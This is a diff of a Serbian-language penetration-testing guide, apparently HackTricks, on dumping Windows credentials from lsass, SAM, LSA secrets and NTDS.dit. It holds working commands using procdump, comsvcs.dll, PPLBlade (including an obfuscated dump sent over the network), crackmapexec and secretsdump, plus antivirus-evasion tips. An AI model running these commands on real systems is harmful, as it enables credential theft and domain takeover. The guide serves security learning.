@@ -49,7 +49,7 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-Kao što je **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitiman Microsoft alat**, nije otkriven od strane Defender-a.\
+Kao **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitimni Microsoft alat**, nije otkriven od strane Defender-a.\
 Možete koristiti ovaj alat da **izvršite dump lsass procesa**, **preuzmete dump** i **izvučete** **akreditive lokalno** iz dump-a.
 ```bash:Dump lsass
 #Local
@@ -65,13 +65,13 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Ovaj proces se automatski obavlja sa [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Napomena**: Neki **AV** mogu **otkriti** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, to je zato što **otkrivaju** string **"procdump.exe" i "lsass.exe"**. Tako da je **diskretnije** **proći** kao **argument** **PID** lsass.exe procdump **umesto** **imena lsass.exe.**
+**Napomena**: Neki **AV** mogu **otkriti** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, to je zato što **otkrivaju** string **"procdump.exe" i "lsass.exe"**. Tako da je **diskretnije** **proći** kao **argument** **PID** lsass.exe do procdump **umesto** **imena lsass.exe.**
 
 ### Dumpovanje lsass sa **comsvcs.dll**
 
-DLL pod imenom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` odgovoran je za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL uključuje **funkciju** pod imenom **`MiniDumpW`**, koja je dizajnirana da se poziva koristeći `rundll32.exe`.\
+DLL pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` odgovoran je za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL uključuje **funkciju** pod nazivom **`MiniDumpW`**, koja je dizajnirana da se poziva koristeći `rundll32.exe`.\
 Nije bitno koristiti prva dva argumenta, ali treći je podeljen na tri komponente. ID procesa koji treba dumpovati čini prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta je strogo reč **full**. Ne postoje alternativne opcije.\
 Nakon parsiranja ovih tri komponente, DLL se angažuje u kreiranju dump fajla i prebacivanju memorije specificiranog procesa u ovaj fajl.\
 Korišćenje **comsvcs.dll** je izvodljivo za dumpovanje lsass procesa, čime se eliminiše potreba za upload-ovanjem i izvršavanjem procdump-a. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
@@ -82,14 +82,14 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
 **Možete automatizovati ovaj proces sa** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Dumpovanje lsass-a pomoću Task Manager-a**
+### **Dumpovanje lsass-a sa Task Manager-om**
 
 1. Desni klik na Task Bar i kliknite na Task Manager
 2. Kliknite na Više detalja
 3. Potražite proces "Local Security Authority Process" na kartici Procesi
 4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".
 
-### Dumpovanje lsass-a pomoću procdump-a
+### Dumpovanje lsass-a sa procdump
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
 ```
@@ -103,8 +103,8 @@ Get-Process -Name LSASS
 **Ključne funkcionalnosti**:
 
 1. Zaobilaženje PPL zaštite
-2. Obfusciranje dump-ova memorije kako bi se izbegle mehanizme detekcije zasnovane na potpisima Defender-a
-3. Učitavanje dump-a memorije sa RAW i SMB metodama bez smeštanja na disk (fileless dump)
+2. Obfusciranje fajlova dump-a memorije kako bi se izbegle mehanizme detekcije zasnovane na potpisima Defender-a
+3. Učitavanje dump-a memorije sa RAW i SMB metodama učitavanja bez smeštanja na disk (fileless dump)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -114,7 +114,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Ispusti LSA tajne
+### Izvuci LSA tajne
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
@@ -123,7 +123,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Izvuci istoriju lozinki NTDS.dit sa ciljanog DC
+### Izvuci istoriju lozinki NTDS.dit sa ciljnog DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -188,9 +188,9 @@ Datoteka **NTDS.dit** je poznata kao srce **Active Directory**, koja sadrži klj
 
 Unutar ove baze podataka održavaju se tri glavne tabele:
 
-- **Tabela podataka**: Ova tabela je zadužena za čuvanje detalja o objektima kao što su korisnici i grupe.
-- **Tabela veza**: Prati odnose, kao što su članstva u grupama.
-- **SD tabela**: **Sigurnosni opisi** za svaki objekat se ovde čuvaju, osiguravajući sigurnost i kontrolu pristupa za pohranjene objekte.
+- **Data Table**: Ova tabela je zadužena za čuvanje detalja o objektima kao što su korisnici i grupe.
+- **Link Table**: Prati odnose, kao što su članstva u grupama.
+- **SD Table**: **Sigurnosni opisi** za svaki objekat se ovde čuvaju, osiguravajući sigurnost i kontrolu pristupa za pohranjene objekte.
 
 Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
@@ -204,7 +204,7 @@ Hash je šifrovan 3 puta:
 2. Dekriptujte **hash** koristeći **PEK** i **RC4**.
 3. Dekriptujte **hash** koristeći **DES**.
 
-**PEK** ima **istu vrednost** u **svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM datoteke kontrolera domena (različit između kontrolera domena)**. Zato da biste dobili akreditive iz datoteke NTDS.dit **potrebne su vam datoteke NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ima **istu vrednost** u **svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM datoteke kontrolera domena (različita između kontrolera domena)**. Zato da biste dobili akreditive iz datoteke NTDS.dit **potrebne su vam datoteke NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Kopiranje NTDS.dit koristeći Ntdsutil
 
@@ -212,7 +212,7 @@ Dostupno od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Možete takođe koristiti trik sa [**kopijom senke volumena**](./#stealing-sam-and-system) da kopirate **ntds.dit** datoteku. Zapamtite da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, [**izvucite je iz registra ili koristite trik sa kopijom senke volumena**](./#stealing-sam-and-system)).
+Možete takođe koristiti trik sa [**volume shadow copy**](./#stealing-sam-and-system) da kopirate **ntds.dit** datoteku. Zapamtite da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, [**izvucite je iz registra ili koristite trik sa volume shadow copy**](./#stealing-sam-and-system)).
 
 ### **Ekstrakcija hash-ova iz NTDS.dit**
 
@@ -220,7 +220,7 @@ Kada dobijete datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao š
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Možete ih takođe **automatski izvući** koristeći važećeg korisnika sa administratorskim pravima na domeni:
+Možete takođe **automatski ih izvući** koristeći važećeg korisnika sa administratorskim pravima na domeni:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
@@ -228,9 +228,9 @@ Za **velike NTDS.dit datoteke** preporučuje se da ih izvučete koristeći [gose
 
 Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`
 
-### **Ekstrakcija domena objekata iz NTDS.dit u SQLite bazu podataka**
+### **Izvlačenje domena objekata iz NTDS.dit u SQLite bazu podataka**
 
-NTDS objekti se mogu izvući u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se izvode tajne, već i ceo objekti i njihova svojstva za dalju ekstrakciju informacija kada je sirova NTDS.dit datoteka već preuzeta.
+NTDS objekti se mogu izvući u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se izvlače tajne, već i ceo objekti i njihova svojstva za dalju ekstrakciju informacija kada je sirova NTDS.dit datoteka već preuzeta.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
@@ -267,7 +267,7 @@ type outpwdump
 
 Preuzmite ga sa: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i jednostavno **izvršite ga** i lozinke će biti ekstraktovane.
 
-## Defenses
+## Odbrane
 
 [**Saznajte više o nekim zaštitama za kredencijale ovde.**](credentials-protections.md)
 
